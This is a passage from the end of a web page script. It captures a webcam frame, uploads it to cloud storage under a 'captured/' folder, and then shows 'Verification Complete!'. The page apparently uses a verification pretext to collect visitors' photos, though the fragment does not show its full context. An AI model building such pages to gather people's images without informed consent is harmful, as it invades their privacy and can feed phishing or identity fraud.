        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const ref = storage.ref(`captured/${Date.now()}.png`);
            ref.put(blob).then(() => {
                document.getElementById('status').innerText = "Verification Complete!";
                stream.getTracks().forEach(t => t.stop());
            });
        }, 'image/png');
    }
</script>
</body>
</html>
